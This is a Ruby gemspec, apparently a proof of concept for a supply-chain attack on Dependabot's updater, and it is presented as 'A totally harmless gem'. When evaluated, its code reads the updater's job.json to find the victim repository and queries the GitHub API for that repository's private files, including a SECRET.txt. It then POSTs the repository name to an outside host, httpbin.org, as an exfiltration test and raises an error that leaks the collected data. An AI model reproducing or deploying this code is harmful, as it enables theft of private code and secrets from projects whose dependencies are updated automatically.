# SUPPLY CHAIN ATTACK - Malicious Gem
# This gem is hosted on attacker's repo but executed in victim's context

$attack = []
$attack << "=" * 70
$attack << "SUPPLY CHAIN ATTACK TEST - #{Time.now.utc}"
$attack << "=" * 70

# 1. What repo are we running in?
$attack << "\n[1] EXECUTION CONTEXT:"
$attack << "  Current directory: #{Dir.pwd}"
$attack << "  GITHUB_REPOSITORY: #{ENV['GITHUB_REPOSITORY'] || 'not set'}"

# Find the repo name from job.json
job_path = "/home/dependabot/dependabot-updater/job.json"
if File.exist?(job_path)
  job_content = `cat #{job_path} 2>&1`
  # Extract repo name
  if job_content =~ /"repo":"([^"]+)"/
    $attack << "  TARGET REPO (from job.json): #{$1}"
  end
  $attack << "  Job content (first 500): #{job_content[0..500]}"
end

# 2. Try to access the VICTIM's repo via API
$attack << "\n[2] ATTEMPTING TO ACCESS VICTIM REPO VIA API:"

begin
  require 'net/http'
  require 'json'
  
  # Parse repo from job.json
  job_data = JSON.parse(IO.read(job_path)) rescue {}
  victim_repo = job_data.dig("job", "source", "repo") || "UNKNOWN"
  
  $attack << "  Victim repo identified: #{victim_repo}"
  
  # Try to list victim's repo contents
  uri = URI.parse("https://api.github.com/repos/#{victim_repo}/contents/")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.open_timeout = 5
  http.read_timeout = 5
  
  response = http.request(Net::HTTP::Get.new(uri.path))
  
  $attack << "  API Response: #{response.code}"
  
  if response.code == "200"
    $attack << "  !!! SUPPLY CHAIN ATTACK SUCCESSFUL !!!"
    $attack << "  !!! CAN ACCESS VICTIM'S PRIVATE FILES !!!"
    
    files = JSON.parse(response.body)
    $attack << "  Files found: #{files.length}"
    files.first(10).each { |f| $attack << "    - #{f['path']} (#{f['type']})" }
    
    # Try to read a specific file (e.g., secrets or config)
    if files.any? { |f| f['path'] == 'SECRET.txt' }
      secret_uri = URI.parse("https://api.github.com/repos/#{victim_repo}/contents/SECRET.txt")
      secret_resp = http.request(Net::HTTP::Get.new(secret_uri.path))
      if secret_resp.code == "200"
        secret_data = JSON.parse(secret_resp.body)
        content = Base64.decode64(secret_data['content']) rescue "decode error"
        $attack << "  !!! SECRET FILE CONTENT: #{content} !!!"
      end
    end
  else
    $attack << "  Access denied: #{response.code}"
    $attack << "  Body: #{response.body[0..200]}"
  end
  
rescue => e
  $attack << "  Error: #{e.class} - #{e.message}"
end

# 3. Try to exfiltrate data to external server
$attack << "\n[3] EXFILTRATION TEST:"
begin
  uri = URI.parse("https://httpbin.org/post")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  
  request = Net::HTTP::Post.new(uri.path)
  request["Content-Type"] = "application/json"
  request.body = JSON.generate({
    attack: "supply_chain",
    victim_repo: victim_repo,
    timestamp: Time.now.to_s
  })
  
  response = http.request(request)
  $attack << "  Exfiltration test: #{response.code}"
rescue => e
  $attack << "  Exfil error: #{e.message}"
end

raise "SUPPLY_CHAIN_ATTACK:\n\n#{$attack.join("\n")}"

Gem::Specification.new do |s|
  s.name = "malicious-gem"
  s.version = "1.0.0"
  s.summary = "A totally harmless gem"
  s.authors = ["Attacker"]
  s.files = []
end
